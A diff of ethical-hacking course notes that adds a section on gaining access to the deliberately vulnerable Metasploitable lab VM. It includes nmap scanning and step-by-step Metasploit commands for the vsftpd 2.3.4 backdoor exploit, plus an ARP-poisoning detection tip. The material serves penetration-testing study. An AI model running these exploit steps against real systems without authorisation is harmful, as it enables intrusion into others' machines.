@@ -15,10 +15,11 @@
 
 ****
 
-## Lab setup
+# Lab setup
 * Install kali linux.
 * Buy an external USB WiFi dongle. Normally internal WiFi adapters do not support monitor mode, packet injections. [Setup USB WiFi adapter on virtual box](https://www.youtube.com/watch?v=RiTICcLH4kU)
 
+# Network hacking
 ## Network hacking basics
 ### Attack types
   1.	Pre-connection attacks
@@ -324,6 +325,42 @@ Then follow bypassing HTTPS procedure.
 Using [hostapd-mana](https://github.com/sensepost/hostapd-mana)
 
 Edit hostapd.conf according to wiki and run `./hostapd hostapd.conf`
+### Detect ARP poisoning attack
+Use xarp.
 
+# Gaining access
+## Server side attacks
+### Metasploitable
+The intentionally vulnerable target machine. Download [here](https://information.rapid7.com/download-metasploitable-2017.html). Configue metasploitable in VirtualBox [here](https://www.youtube.com/watch?v=a0X9-lCOsEo).
+### Information gathering
+Get IP of server. e.g.
+```
+ping google.com
+```
+Get detailed info. Check for running services. Run nmap.
+```
+nmap -T4 -A -v [IP]
+```
+### Metasploit
+A penetration testing framework. Run metasploit.
+```
+msfconsole
+```
+#### e.g. VSTPD v2.3.4 backdoor command execution.
+```
+use exploit/unix/ftp/vsftpd_234_backdoor
+```
+To show options.
+```
+show options
+```
+Change RHOST.
+```
+set RHOST [serverIP]
+```
+Run exploit. If fails, run again.
+```
+exploit
+```
 
 Source: [Udemy: Learn ethical hacking from scratch by Zaid](https://www.udemy.com/course/learn-ethical-hacking-from-scratch/)
